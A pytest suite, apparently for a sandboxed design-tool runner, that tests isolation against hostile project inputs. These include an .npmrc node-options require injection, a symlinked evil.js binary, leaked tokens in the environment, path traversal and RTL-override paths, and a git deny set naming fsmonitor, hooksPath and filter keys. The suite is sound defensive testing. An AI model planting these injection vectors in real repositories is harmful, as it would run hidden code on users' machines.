    leaks = [str(x) for x in (proj.root / "outputs").rglob("*") if x.is_file() and b"abc-killed" in x.read_bytes()]
    staged = [x for x in (proj.tmp / "runner-tmp").rglob("*") if x.is_file() and b"abc-killed" in x.read_bytes()]
    return leaks, staged


def test_design_run_artifact_staging_sigkill(proj):
    order, sha, flag = _kill_fixture(proj)
    p = subprocess.Popen([PY, "-I", str(RUNNER), "--order", order, "--sha256", sha], cwd=str(proj.root),
                         env=proj.env(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True)
    leaks, staged = _kill_and_check(proj, p, flag)
    assert leaks == []
    assert staged  # the unredacted copy exists only under the test's TMPDIR


def test_mutation_stage_out_bypassed_turns_artifact_staging_red(proj):
    order, sha, flag = _kill_fixture(proj)
    launcher = FIXTURES / "mutant_launcher.py"
    p = subprocess.Popen([PY, "-I", str(launcher), str(RUNNER), "stage-bypass", "--order", order, "--sha256", sha],
                         cwd=str(proj.root), env=proj.env(), stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         start_new_session=True)
    leaks, _ = _kill_and_check(proj, p, flag)
    assert leaks  # children writing straight into outputs/ leave unredacted bytes after SIGKILL


# ------------------------------------------------------------------------------------------------
# X3 package-manager layer, X5 tree changes, X7 strict JSON, X8 outputs
# ------------------------------------------------------------------------------------------------

def test_design_run_npmrc_node_options(proj, dr):
    proj.write(".npmrc", "node-options=--require=./x.js\n")
    proj.write("x.js", "require('fs').writeFileSync(%r, 'ran')\n" % str(proj.markers / "HOSTILE-npmrc"))
    proj.commit("npmrc")
    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, extra_env={"NODE_OPTIONS": "--require=./x.js"})
    assert res.code == 0, res.err
    call = proj.stub_calls("playwright")[0]
    assert "NODE_OPTIONS" not in call["env"]
    assert call["argv0_real"] == os.path.realpath(proj.root / "node_modules/playwright/cli.js")
    assert res.run("r1")["executable"] == os.path.realpath(proj.root / "node_modules/playwright/cli.js")
    assert proj.hostiles() == []  # no package manager stub, no x.js, no node


def test_design_run_bin_escape(proj, dr):
    os.remove(proj.root / "node_modules/.bin/playwright")
    proj.write("evil.js", proj.stub_text("evil"), 0o755)
    os.symlink("../../evil.js", proj.root / "node_modules/.bin/playwright")
    o, s = proj.order([RUN_UI])
    assert blocked(proj.run(dr, o, s), "design-run-tool-unsafe playwright")
    assert proj.stub_calls("evil") == []


def test_tool_missing(proj, dr):
    os.remove(proj.root / "node_modules/.bin/playwright")
    o, s = proj.order([RUN_UI])
    err = blocked(proj.run(dr, o, s), "design-run-tool-missing playwright")
    assert "shode-house:devops-engineer" in err
    assert proj.hostiles() == []


def test_design_run_tree_changed(proj, dr):
    proj.set_ctl("playwright", create=["tests/visual/y.spec.ts"])
    o, s = proj.order([RUN_UI, dict(RUN_UI, id="r2")])
    res = proj.run(dr, o, s)
    assert res.code == 1
    assert res.run("r1")["status"] == "tree-changed"
    assert "tests/visual/y.spec.ts" in res.run("r1")["tree_changed_paths"]
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "tree-changed"
    assert len(proj.stub_calls("playwright")) == 1


def test_design_run_tree_changed_writes_allowed(proj, dr):
    proj.set_ctl("playwright", create=["test-results/out.txt", "playwright-report/index.html"])
    o, s = proj.order([RUN_UI, dict(RUN_UI, id="r2")])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    assert len(proj.stub_calls("playwright")) == 2


STRICT_CASES = [
    ("dup-key", '{"schema": 1, "task": "t-1", "phase": "3a", "iter": 1, "runs": [{"id": "r1", '
                '"script_id": "contrast-pair", "params": {"fg": "#000000", "fg": "#FFFFFF", "bg": "#FFFFFF"}}]}'),
    ("nan", '{"schema": 1, "task": "t-1", "phase": "3a", "iter": NaN, "runs": []}'),
    ("surrogate", '{"schema": 1, "task": "t-1\\udc80", "phase": "3a", "iter": 1, "runs": []}'),
    ("bom", "\ufeff" + json.dumps({"schema": 1, "task": "t-1", "phase": "3a", "iter": 1, "runs": [RUN_PAIR]})),
    ("trailing-nl-id", json.dumps({"schema": 1, "task": "t-1", "phase": "3a", "iter": 1,
                                   "runs": [dict(RUN_PAIR, id="r1\n")]})),
    ("bool-iter", json.dumps({"schema": 1, "task": "t-1", "phase": "3a", "iter": True, "runs": [RUN_PAIR]})),
]


@pytest.mark.parametrize("name,raw", STRICT_CASES)
def test_design_run_strict_json(proj, dr, name, raw):
    o, s = proj.order(None, raw_request=raw)
    blocked(proj.run(dr, o, s), "design-run-schema")


def test_design_run_strict_json_order_side(proj, dr):
    o, s = proj.order([RUN_PAIR], task="..")
    blocked(proj.run(dr, o, s), "design-run-schema")
    o, s = proj.order([RUN_PAIR], it=2)
    blocked(proj.run(dr, o, "0" * 64, argv=["--order", "outputs/t-1/../t-1/" + o.split("/")[-1], "--sha256", s]),
            "design-run-schema")
    o, s = proj.order([RUN_PAIR], it=3, order_extra={"task": "t-1\n"})
    blocked(proj.run(dr, o, s), "design-run-schema")
    o, s = proj.order([RUN_PAIR], it=3, nn="03", change_paths=["../x"])
    blocked(proj.run(dr, o, s), "design-run-schema")
    o, s = proj.order([RUN_PAIR], it=3, nn="04", change_paths=["a/\u202eb"])
    blocked(proj.run(dr, o, s), "design-run-schema")


def test_design_run_output_exists(proj, dr):
    o, s = proj.order([RUN_PAIR])
    (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1").mkdir(parents=True)
    assert "02-design-run-order-3a-iter1" in blocked(proj.run(dr, o, s), "design-run-output-exists")
    o, s = proj.order([RUN_PAIR], it=2)
    (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter2.report.json").write_text("{}")
    blocked(proj.run(dr, o, s), "design-run-output-exists")


def test_design_run_dependency_failed(proj, dr):
    proj.stub_scripts()
    proj.set_ctl("search", exit=1)
    o, s = proj.order([
        {"id": "r1", "script_id": "design-search", "params": {"query": "q", "variance": 1, "motion": 1,
                                                              "density": 1, "project": "p"}},
        {"id": "r2", "script_id": "contrast-check", "params": {"ds": "r1"}},
    ], phase="1b")
    res = proj.run(dr, o, s, spy_open=True)
    assert res.code == 1
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "dependency-failed"
    assert len(res.spawns) == 1
    assert not [p for p, m in res.opens if p.endswith("/r1.json") and "r" in m and "w" not in m]


def test_hash_mismatch(proj, dr):
    o, s = proj.order([RUN_PAIR])
    blocked(proj.run(dr, o, "0" * 64), "design-run-order-hash")
    o, s = proj.order([RUN_PAIR], it=2, order_extra={"request_sha256": "0" * 64})
    blocked(proj.run(dr, o, s), "design-run-request-hash")


def test_symlink_order(proj, dr):
    o, s = proj.order([RUN_PAIR])
    expected = "BLOCKED: design-run-untrusted-input %s (symlink)" % o
    real = proj.root / "outputs/t-1/real-order.json"
    os.rename(proj.root / o, real)
    os.symlink("real-order.json", proj.root / o)
    assert blocked(proj.run(dr, o, s), "design-run-untrusted-input").strip() == expected
    os.remove(proj.root / o)
    os.rename(real, proj.root / o)
    # a symlinked task directory that stays inside outputs/: only the per-component lstat walk sees
    # it (O_NOFOLLOW covers the last component, the realpath check passes) -- Chris W12 M19
    shutil.move(str(proj.root / "outputs/t-1"), str(proj.root / "outputs/real-t1"))
    os.symlink("real-t1", str(proj.root / "outputs/t-1"))
    assert blocked(proj.run(dr, o, s), "design-run-untrusted-input").strip() == expected
    # a symlinked task directory pointing outside the project
    os.remove(proj.root / "outputs/t-1")
    shutil.move(str(proj.root / "outputs/real-t1"), str(proj.tmp / "outside-t1"))
    os.symlink(str(proj.tmp / "outside-t1"), proj.root / "outputs/t-1")
    assert blocked(proj.run(dr, o, s), "design-run-untrusted-input").strip() == expected


SCHEMA_CASES = [
    ("unknown-order-key", dict(order_extra={"extra": 1}), "design-run-schema order key extra"),
    ("unknown-request-key", dict(request_extra={"extra": 1}), "design-run-schema request key extra"),
    ("unknown-script", dict(runs=[{"id": "r1", "script_id": "chromatic", "params": {}}]),
     "design-run-schema r1.script_id"),
    ("phase-not-allowed", dict(runs=[{"id": "r1", "script_id": "design-search", "params": {
        "query": "q", "variance": 1, "motion": 1, "density": 1, "project": "p"}}]),
     "design-run-schema r1.script_id phase"),
    ("extra-param", dict(runs=[dict(RUN_PAIR, params={"fg": "#000000", "bg": "#FFFFFF", "x": 1})]),
     "design-run-schema r1.params"),
    ("missing-param", dict(runs=[dict(RUN_PAIR, params={"fg": "#000000"})]), "design-run-schema r1.params"),
    ("dup-run-id", dict(runs=[RUN_PAIR, RUN_PAIR]), "design-run-schema run id"),
    ("request-task-mismatch", dict(req_task="t-2"), "design-run-schema request task"),
    ("1b-change-paths-without-quote", dict(phase="1b", change_paths=["src/a.ts"],
                                            runs=[{"id": "r1", "script_id": "design-query-domain",
                                                   "params": {"query": "q", "domain": "style", "n": 1}}]),
     "design-run-schema order change_confirmation"),
    ("bad-loopback-ports", dict(loopback_ports=[0]), "design-run-schema order loopback_ports"),
]


@pytest.mark.parametrize("name,kw,token", SCHEMA_CASES)
def test_schema(proj, dr, name, kw, token):
    kw = dict(kw)
    runs = kw.pop("runs", [RUN_PAIR])
    o, s = proj.order(runs, **kw)
    assert blocked(proj.run(dr, o, s), token).strip() == "BLOCKED: " + token


def test_schema_too_many_runs(proj, dr):
    runs = [dict(RUN_PAIR, id="r%d" % i) for i in range(1, 10)]
    o, s = proj.order(runs)
    blocked(proj.run(dr, o, s), "design-run-too-many-runs")


def test_schema_param_types(proj, dr):
    o, s = proj.order([{"id": "r1", "script_id": "design-query-domain",
                        "params": {"query": "q", "domain": "style", "n": True}}])
    blocked(proj.run(dr, o, s), "design-run-param r1.n")
    o, s = proj.order([{"id": "r1", "script_id": "design-query-domain",
                        "params": {"query": "q", "domain": "nope", "n": 1}}], it=2)
    blocked(proj.run(dr, o, s), "design-run-param r1.domain")
    o, s = proj.order([dict(RUN_PAIR, params={"fg": "#00000G", "bg": "#FFFFFF"})], it=3)
    blocked(proj.run(dr, o, s), "design-run-param r1.fg")
    o, s = proj.order([{"id": "r1", "script_id": "contrast-check", "params": {"ds": "r1"}}], nn="03")
    blocked(proj.run(dr, o, s), "design-run-param r1.ds")  # not an earlier run


def test_no_git(tmp_path, dr):
    p = Proj(tmp_path)
    o, s = p.order([RUN_PAIR])
    blocked(p.run(dr, o, s), "design-run-untrusted-input no-git")


def test_env_allowlist(proj, dr):
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, extra_env={"GITHUB_TOKEN": "ghs_x", "NODE_OPTIONS": "--require=x",
                                        "HTTPS_PROXY": "http://proxy:1", "PLAYWRIGHT_BROWSERS_PATH": "/pw"})
    assert res.code == 0, res.err
    env = proj.stub_calls("axe")[0]["env"]
    for name in ("GITHUB_TOKEN", "NODE_OPTIONS", "HTTPS_PROXY", "XDG_CONFIG_HOME"):
        assert name not in env
    assert env["CI"] == "1" and env["NO_COLOR"] == "1" and env["PLAYWRIGHT_BROWSERS_PATH"] == "/pw"
    assert env["HOME"] == str(proj.tmp / "home")
    assert set(env) <= {"PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "TMPDIR", "PLAYWRIGHT_BROWSERS_PATH",
                        "CI", "NO_COLOR", "__CF_USER_TEXT_ENCODING"}
    assert proj.hostiles() == []


def test_output_dir_fixed(proj, dr):
    o, s = proj.order([{"id": "r1", "script_id": "design-persist", "params": {
        "query": "saas dashboard", "variance": 5, "motion": 5, "density": 5, "project": "Fixture App"}}],
        phase="1b")
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    argv = res.run("r1")["argv"]
    assert argv[argv.index("--output-dir") + 1] == os.path.realpath(proj.root)
    assert "--force" not in argv
    assert (proj.root / "design-system").is_dir()


# ------------------------------------------------------------------------------------------------
# catalogue static rules
# ------------------------------------------------------------------------------------------------

def test_catalogue_static(dr):
    import re
    text = CATALOGUE.read_text()
    cat = json.loads(text)
    low = text.lower()
    assert "--force" not in low and "chromatic" not in low
    for pm in ("pnpm", "npx", "npm", "yarn", "corepack"):
        assert not re.search(r"(?<![a-z0-9_])%s(?![a-z0-9_])" % pm, low), pm
    assert type(cat["schema"]) is int and cat["schema"] == 1                       # not true / 1.0
    assert isinstance(cat["max_runs"], int) and cat["max_runs"] <= 8
    whole = re.compile(r"\{[a-z_]+\}")
    value = re.compile(r"--[a-z][a-z0-9-]*=\{[a-z_]+\}(,\{[a-z_]+\})?")
    code = re.compile(r"<root>|<spec-filter>|<run-json:[a-z_]+>|<out>/<run-id>\.(png|axe\.json|json|txt|log)")
    axe_only = ("<out>/", "<run-id>.axe.json")              # I-4: `--dir <out>/ --save <run-id>.axe.json`
    dr._validate_catalogue(cat)  # the runtime check accepts the shipped catalogue
    for name, t in cat["templates"].items():
        assert t["runner"] in ("plugin-python", "project-bin"), name
        # below the host Bash tool maximum (600 s) with margin; the runner's total budget is the same
        assert isinstance(t["timeout_s"], int) and 0 < t["timeout_s"] <= 540, name
        assert set(t["executes"]) <= {"spec", "playwright-config", "package-json", "lockfiles", "tracked-specs"}, name
        assert t["e3"] in (None, "spec", "default-pattern"), name
        assert t["phases"] and set(t["phases"]) <= {"1b", "3a"}, name
        assert t["network"] in ("none", "loopback", "url"), name
        assert type(t["stdout_json"]) is bool, name
        assert (t["e3"] == "spec") == ("spec" in t), name
        if t["runner"] == "project-bin" and t["bin"] == "playwright" and t["argv"][0] == "test":
            assert t["e3"] is not None, name  # every Playwright test run gets the collision check
        if "spec" in t:                       # Sentinel S2-7: the four semantic asserts
            assert t["params"]["feature"] == "slug", name
        if t["e3"] == "spec":
            assert {"spec", "playwright-config", "package-json", "lockfiles"} <= set(t["executes"]), name
        if t["e3"] == "default-pattern":
            assert "tracked-specs" in t["executes"], name
        assert isinstance(t["writes"], list) and isinstance(t["artifacts"], list), name
        for w in t["writes"]:
            assert re.fullmatch(r"[a-z0-9._{}/-]+/\*\*", w), (name, w)
        for a in t["artifacts"]:
            assert re.fullmatch(r"<run-id>\.(png|axe\.json|json|txt|log)", a), (name, a)
        if t["runner"] == "plugin-python":
            script = (SCRIPTS / t["script"]).resolve()
            assert script.parent == SCRIPTS.resolve() and script.is_file(), name
        else:
            assert re.fullmatch(r"[a-z0-9][a-z0-9._-]{0,40}", t["bin"]), name
        argv = t["argv"]
        for i, el in enumerate(argv):
            if "{" in el or "<" in el:
                assert (whole.fullmatch(el) or value.fullmatch(el) or code.fullmatch(el)
                        or (el in axe_only and argv == AXE_ARGV)), (name, el)
            if el.startswith("<out>"):
                assert t["artifacts"], name
            if el == "--output-dir":
                assert argv[i + 1] == "<root>", name
            if el == "--persist":
                assert not argv[i + 1].startswith("{"), name
        if t["stdout_json"]:
            assert t["artifacts"] == [], name
        placeholders = set(re.findall(r"\{([a-z_]+)\}", " ".join(argv + [t.get("spec", "")])))
        refs = set(re.findall(r"<run-json:([a-z_]+)>", " ".join(argv)))
        assert placeholders | refs == set(t["params"]), name


def test_catalogue_enum_lists_equal_search_py_choices():
    spec = importlib.util.spec_from_file_location("design_intel_core", SCRIPTS / "core.py")
    core = importlib.util.module_from_spec(spec)
    sys.path.insert(0, str(SCRIPTS))
    try:
        spec.loader.exec_module(core)
    finally:
        sys.path.remove(str(SCRIPTS))
    cat = json.loads(CATALOGUE.read_text())["templates"]
    assert cat["design-query-domain"]["params"]["domain"]["enum"] == list(core.CSV_CONFIG.keys())
    assert cat["design-query-stack"]["params"]["stack"]["enum"] == list(core.AVAILABLE_STACKS)
    search_src = (SCRIPTS / "search.py").read_text()
    assert "choices=list(CSV_CONFIG.keys())" in search_src and "choices=AVAILABLE_STACKS" in search_src


# ------------------------------------------------------------------------------------------------
# test_git_isolation (section 5.6.12)
# ------------------------------------------------------------------------------------------------

def _w12_test_files():
    files = [Path(__file__)]
    files += [p for p in FIXTURES.rglob("*") if p.is_file() and p.suffix in (".py", ".sh", ".json", ".txt")]
    return files


def test_git_isolation_static_scan():
    hits = gitiso.static_scan(_w12_test_files())
    assert hits == [], hits
    probe = Path(__file__).parent / "fixtures" / "design_run" / "probe_should_not_exist.py"
    assert not probe.exists()


def test_git_isolation_static_scan_detects(tmp_path):
    bad = tmp_path / "bad.py"
    bad.write_text("subprocess.run([" + "'git', 'status'])\nx = ['config', '--" + "global', 'a', 'b']\n"
                   "env['GIT_CONFIG_" + "GLOBAL'] = '/x'\n")
    names = {h[2] for h in gitiso.static_scan([bad])}
    assert names == {"git-argv0", "config-global-or-system", "git-config-global-assignment"}


def test_git_isolation_helper_refusal(tmp_path, monkeypatch):
    started = []
    monkeypatch.setattr(gitiso.subprocess, "run", lambda *a, **k: started.append(a))
    for key in gitiso.ISOLATION_KEYS:
        env = gitiso.base_env(tmp_path)
        del env[key]
        with pytest.raises(gitiso.IsolationError):
            gitiso.git_isolated(["status"], tmp_path, env_override=env)
    env = gitiso.base_env(tmp_path)
    env["HOME"] = gitiso.real_home()
    with pytest.raises(gitiso.IsolationError):
        gitiso.git_isolated(["status"], tmp_path, env_override=env)
    with pytest.raises(gitiso.IsolationError):
        gitiso.git_isolated(["config", "--" + "system", "a.b", "c"], tmp_path)
    with pytest.raises(gitiso.IsolationError):
        gitiso.git_isolated(["status"], tmp_path, extra_env={"HOME": "/"})
    assert started == []


def _positive_check(tmp):
    gitiso.config_global(tmp, "test.isolation", "1")
    assert "isolation = 1" in (Path(tmp) / "home" / ".gitconfig").read_text()
    out = gitiso.git_isolated(["config", "--list", "--show-origin", "--show-scope"], tmp).stdout.decode()
    real_tmp = os.path.realpath(str(tmp))
    for line in out.splitlines():
        scope, origin = line.split("\t")[0], line.split("\t")[1]
        if scope in ("global", "system"):
            assert origin.startswith("file:")
            assert os.path.realpath(origin[5:]).startswith(real_tmp + os.sep), line
    assert gitiso.stat_snapshot(_WATCHED) == _BEFORE


def test_git_isolation_positive(tmp_path):
    _positive_check(tmp_path)


@pytest.mark.parametrize("dropped", gitiso.ISOLATION_KEYS)
def test_mutation_isolation_var_removed_turns_git_isolation_red(tmp_path, monkeypatch, dropped):
    real = gitiso.isolation_env

    def leaky(tmp):
        env = real(tmp)
        env.pop(dropped)
        return env

    monkeypatch.setattr(gitiso, "isolation_env", leaky)
    with pytest.raises(gitiso.IsolationError):
        _positive_check(tmp_path)


def test_git_isolation_watches_host_system_config():
    cands = gitiso.system_config_candidates()
    assert "/etc/gitconfig" in cands
    assert any(c.endswith("share/git-core/gitconfig") or c.endswith("etc/gitconfig") for c in cands)
    assert all(p in _WATCHED for p in cands)


# ------------------------------------------------------------------------------------------------
# further runner paths
# ------------------------------------------------------------------------------------------------

def test_interpreter_inside_project_is_a_tripwire(proj, dr):
    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(sys, "executable", str(proj.root / "venv" / "python3"))])
    blocked(res, "design-run-untrusted-input interpreter")
    assert res.git_calls == []


def test_cwd_must_be_the_work_tree_top_level(proj, dr):
    o, s = proj.order([RUN_PAIR])
    blocked(proj.run(dr, o, s, cwd=proj.root / "tests"), "design-run-untrusted-input cwd")


def test_run_timeout_kills_the_child_and_exits_1(proj, dr):
    proj.set_ctl("axe", sleep=30)
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"]["axe-scan"]["timeout_s"] = 1
    raw = json.dumps(cat).encode()
    o, s = proj.order([RUN_AXE])
    started = time.time()
    res = proj.run(dr, o, s, patches=[(dr, "_load_catalogue", lambda: (cat, hashlib.sha256(raw).hexdigest()))])
    assert res.code == 1 and res.run("r1")["status"] == "timeout" and res.run("r1")["exit_code"] is None
    assert time.time() - started < 20


def test_internal_error_exit_4_with_redacted_traceback(proj, dr):
    def boom(*a, **k):
        raise RuntimeError("password=hunter2 exploded")

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_stage_out", boom)])
    assert res.code == 4
    assert "RuntimeError" in res.report["error"] and "hunter2" not in res.report["error"]
    assert list((proj.tmp / "runner-tmp").iterdir()) == []


def test_stream_cap_sets_truncated(proj, dr):
    proj.set_ctl("axe", stdout="x" * 5000)
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "STREAM_CAP", 1000)])
    assert res.code == 0
    assert res.run("r1")["stdout"]["truncated"] is True and res.run("r1")["stdout"]["bytes"] == 1000


def test_submodule_deinit_keeps_modules_dir_and_still_blocks(proj, dr):
    """I-5: `git submodule deinit` leaves <common-dir>/modules/<name>, so E0 over-blocks (R18)."""
    _submodule_with_filter(proj)
    proj.git("submodule", "deinit", "-q", "-f", "sub")
    assert (proj.root / ".git/modules/sub").is_dir() and list((proj.root / "sub").iterdir()) == []
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input submodule .git/modules/sub")
    assert "submodule sub" not in err.replace("submodule .git/modules/sub", "")
    assert proj.hostiles() == []


@pytest.mark.parametrize("key,value,denied", [
    ("core.fsmonitor", "true", True), ("core.fsmonitor", "false", False), ("core.fsmonitor", None, True),
    ("core.fsmonitor", "/x/hook", True), ("core.hooksPath", "x", True), ("core.worktree", "/", True),
    ("core.excludesFile", "x", True), ("filter.lfs.clean", "x", True), ("filter.a.b.smudge", "x", True),
    ("filter.x.process", "x", True), ("filter.x.required", "true", False), ("core.editor", "vim", False),
    ("core.attributesFile", "x", True), ("attr.tree", "HEAD", True), ("attr.tree", "", True),
])
def test_deny_set(dr, key, value, denied):
    assert dr._deny_key(key, value) is denied


def test_local_hookspath_blocks(proj, dr):
    proj.git("config", "core.hooksPath", str(proj.tmp / "hooks"))
    o, s = proj.order([RUN_PAIR])
    blocked(proj.run(dr, o, s), "design-run-untrusted-input git-config core.hookspath (file:.git/config)")


def test_empty_untracked_directories_do_not_block(proj, dr):
    """Found against real Playwright in scratch: `--directory` alone lists empty directories."""
    (proj.root / "foo").mkdir()
    (proj.root / "tests/empty/deeper").mkdir(parents=True)
    o, s = proj.order([RUN_UI])
    assert proj.run(dr, o, s).code == 0


# ------------------------------------------------------------------------------------------------
# iter 2: review findings (Chris W12 S-1..S-5, L-1, L-2; Sentinel W12 S-3, S-4; router timeout cap)
# ------------------------------------------------------------------------------------------------

def test_child_breaking_git_after_start_is_tree_changed_not_blocked(proj, dr):
    """Chris S-1: the child writes `.git/HEAD`, so the post-run git snapshot fails. The run is
    tree-changed (exit 1) with a written report and streams, never exit 3 with a 0-byte report."""
    proj.set_ctl("axe", create=[".git/HEAD"], stdout="child output\n")
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    res = proj.run(dr, o, s)
    assert res.code == 1, (res.code, res.err)
    assert res.err == ""
    r1 = res.run("r1")
    assert r1["status"] == "tree-changed" and r1["reason"].startswith("design-run-tool-unsafe git"), r1
    assert (proj.root / r1["stdout"]["path"]).read_text() == "child output\n"
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "tree-changed"
    assert len(res.spawns) == 1 and res.report["exit"] == 1


def test_blocked_with_report_open_never_exits_3_after_a_child(proj, dr):
    """Chris S-1 (main): a Blocked that reaches main after a child started writes the report, exit 1."""
    real = dr._post_run

    def post_run_then_blocked(*a, **k):
        real(*a, **k)
        raise dr.Blocked("design-run-tool-unsafe", "git (ls-files exit 128)")

    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "_post_run", post_run_then_blocked)])
    assert res.code == 1 and res.report["exit"] == 1
    assert res.report["error"] == "BLOCKED: design-run-tool-unsafe git (ls-files exit 128)"


def test_private_dir_failure_leaves_nothing_that_blocks_a_retry(proj, dr):
    """Chris L-1: exit 3 from step 8 leaves no report and no run dir; the retry runs."""
    def no_tmp(root):
        raise dr.Blocked("design-run-untrusted-input", "tmpdir")

    o, s = proj.order([RUN_PAIR])
    blocked(proj.run(dr, o, s, patches=[(dr, "_private_dir", no_tmp)]), "design-run-untrusted-input tmpdir")
    assert not (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1.report.json").exists()
    assert not (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1").exists()
    assert proj.run(dr, o, s).code == 0


def test_child_streams_are_capped_when_written(proj, dr):
    """Chris L-2: the raw stream file never grows past STREAM_CAP + 1 bytes."""
    proj.set_ctl("axe", stdout="x" * 50000)
    sizes = []
    real = dr._capture

    def capture(raw_path):
        sizes.append(os.path.getsize(raw_path))
        return real(raw_path)

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "STREAM_CAP", 1000), (dr, "_capture", capture)])
    assert res.code == 0, res.err
    assert sizes and max(sizes) <= 1001, sizes
    assert res.run("r1")["stdout"]["truncated"] is True


def test_run_budget_cuts_timeouts_and_skips_the_rest(proj, dr):
    """Router item: the whole invocation stays inside RUN_BUDGET_S (below the host tool maximum)."""
    proj.set_ctl("axe", sleep=30)
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    started = time.time()
    # Chris C24-4: a 6 s budget leaves 4.5 s for steps 1-8 and r1's pre-run checks (worst measured
    # under load about 1 s), so a slow host does not turn r1 into `budget-exhausted`
    res = proj.run(dr, o, s, patches=[(dr, "RUN_BUDGET_S", 6), (dr, "POST_RUN_RESERVE_S", 0.5)])
    assert time.time() - started < 25
    assert res.code == 1, (res.code, res.err)
    r1, r2 = res.run("r1"), res.run("r2")
    assert r1["status"] == "timeout" and r1["timeout_s"] <= 6, r1
    assert r2["status"] == "skipped" and r2["reason"] == "budget-exhausted", r2
    assert len(proj.stub_calls("axe")) == 1


def _alive(pid):
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    return True


def _wait_gone(pid, seconds=10):
    deadline = time.time() + seconds
    while _alive(pid) and time.time() < deadline:
        time.sleep(0.05)
    return not _alive(pid)


def _start_and_wait_for_child(proj, cmd):
    order, sha, flag = _kill_fixture(proj)
    p = subprocess.Popen(cmd + ["--order", order, "--sha256", sha], cwd=str(proj.root), env=proj.env(),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True)
    deadline = time.time() + 30
    while not flag.exists() and time.time() < deadline:
        time.sleep(0.05)
    assert flag.exists(), "stub never started"
    time.sleep(0.2)
    return p, int(flag.read_text())


@pytest.mark.parametrize("sig", [signal.SIGTERM, signal.SIGHUP])
def test_runner_signal_kills_the_child_and_cleans_up(proj, sig):
    """Chris S-2: SIGTERM/SIGHUP to the runner kill the child's group, write the report and remove
    the private dir. (SIGKILL of the runner orphans the child: documented residual.)"""
    p, child = _start_and_wait_for_child(proj, [PY, "-I", str(RUNNER)])
    os.kill(p.pid, sig)
    out, err = p.communicate(timeout=30)
    assert p.returncode == 1, err
    assert _wait_gone(child), "child survived the runner"
    assert list((proj.tmp / "runner-tmp").iterdir()) == []
    rep = json.loads((proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1.report.json").read_text())
    assert rep["exit"] == 1 and rep["error"] == "terminated (%s)" % signal.Signals(sig).name
    name = signal.Signals(sig).name
    assert [(r["status"], r["reason"]) for r in rep["runs"]] == [("terminated", "terminated (%s)" % name)]
    assert [x for x in (proj.root / "outputs").rglob("*") if x.is_file() and b"abc-killed" in x.read_bytes()] == []


def test_mutation_no_signal_handlers_turns_runner_kill_red(proj):
    p, child = _start_and_wait_for_child(proj, [PY, "-I", str(FIXTURES / "mutant_launcher.py"), str(RUNNER),
                                                "no-signal-handlers"])
    try:
        os.kill(p.pid, signal.SIGTERM)
        p.communicate(timeout=30)
        assert p.returncode == -signal.SIGTERM
        assert _alive(child)  # without the handlers the child outlives the runner
        assert list((proj.tmp / "runner-tmp").iterdir()) != []  # and the private dir is left behind
    finally:
        try:
            os.kill(child, signal.SIGKILL)
        except ProcessLookupError:
            pass


def test_spawn_child_kills_the_group_on_systemexit(dr, tmp_path):
    """The `finally` in _spawn_child: an exception while waiting (as raised by the SIGTERM handler)
    still kills the child's process group."""
    pidfile = tmp_path / "pid"
    script = "import os,time; open(%r,'w').write(str(os.getpid())); time.sleep(30)" % str(pidfile)
    real_pump = dr._pump

    def pump_then_exit(proc, pairs, timeout):
        deadline = time.time() + 10
        while not pidfile.exists() and time.time() < deadline:
            time.sleep(0.05)
        raise SystemExit(1)

    dr._pump = pump_then_exit
    try:
        with open(os.devnull, "wb") as out, pytest.raises(SystemExit):
            dr._spawn_child([PY, "-c", script], str(tmp_path), {"PATH": "/usr/bin:/bin"}, out, out, 30)
    finally:
        dr._pump = real_pump
    assert _wait_gone(int(pidfile.read_text()))


# Chris S-3: the three probe tests (pre-run E3 re-check, HEAD leg of blob_verified, TMPDIR inside)

def test_design_run_prerun_e3_sees_earlier_writes(proj, dr):
    """X5: a spec match written by an earlier run is never loaded by a later one. r1 has no E3 (so
    no post-run re-walk) and writes into an ignored directory the git diff cannot see; r2's
    pre-run E3 check is the layer that catches it."""
    proj.write("dist/build.txt", "dist/ exists, so git lists it as one collapsed entry\n")
    proj.set_ctl("axe", create=["dist/tests/visual/checkout.spec.ts"])
    o, s = proj.order([RUN_AXE, dict(RUN_UI, id="r2")])
    res = proj.run(dr, o, s)
    assert res.run("r1")["status"] == "exit"
    assert res.run("r2")["status"] == "tree-changed", res.run("r2")
    assert "dist/tests/visual/checkout.spec.ts (filter-collision)" in res.run("r2")["reason"]
    assert proj.stub_calls("playwright") == []


def test_design_run_spec_match_written_under_writes_is_tree_changed(proj, dr):
    """X5 with S2-2: a spec match the run itself writes under its `writes` is caught by the
    post-run re-walk, so r1 is tree-changed and r2 never starts."""
    proj.set_ctl("playwright", create=["test-results/tests/visual/checkout.spec.ts"])
    o, s = proj.order([RUN_UI, dict(RUN_UI, id="r2")])
    res = proj.run(dr, o, s)
    r1 = res.run("r1")
    assert r1["status"] == "tree-changed" and r1["tree_changed_paths"] == ["test-results/tests/visual/checkout.spec.ts"]
    assert res.run("r2")["status"] == "skipped" and len(proj.stub_calls("playwright")) == 1


